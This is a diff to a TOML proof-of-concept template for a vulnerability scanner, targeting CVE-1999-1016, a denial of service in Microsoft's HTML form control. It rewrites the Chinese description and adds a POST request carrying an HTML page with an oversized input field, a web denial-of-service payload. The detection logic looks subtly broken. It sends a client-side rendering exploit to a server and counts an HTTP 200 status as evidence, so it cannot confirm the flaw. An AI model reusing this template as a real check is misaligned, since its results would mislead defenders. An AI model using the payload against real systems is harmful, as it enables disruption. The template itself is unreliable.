@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Microsoft HTML 控件在解析包含超大文本输入框（如表格单元格中的大型 <input> 字段）的恶意网页或 HTML 邮件时，会触发 CPU 资源耗尽（100% 占用），造成拒绝服务。该 PoC 通过构造包含超大表单字段的 HTML 页面来验证目标是否易受此拒绝服务问题影响。"
+description = "Microsoft HTML 控件（影响 IE5.0、FrontPage Express、Outlook Express 5、Eudora 等）在处理超大 HTML 表单字段（如表单元格中的大型文本输入框）时会因持续渲染处理导致 CPU 占用率升至 100%，造成拒绝服务。该 PoC 通过构造包含超大尺寸表单字段的 HTML 页面验证目标在渲染时是否出现 CPU 耗尽行为。"
 id = "POC-AVE-1999-0866"
-name = "CVE-1999-1016 Internet Explorer 5 HTML 表单控件拒绝服务 PoC"
+name = "CVE-1999-1016 Microsoft HTML Form Control DoS PoC"
 severity = "medium"
 tags = ["ave-1999-0866"]
 vuln_id = [
@@ -15,12 +15,33 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cve-1999-1016-dos.html"
+path = "/{{BaseURL}}/cve-1999-1016.html"
 protocol = "http"
 
 [poc.requests.body]
 content = ""
 type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cve-1999-1016-submit"
+protocol = "http"
+
+[poc.requests.body]
+content = '<html><body><table><tr><td><input type="text" name="x" size="999999999" value="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"></td></tr></table></body></html>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
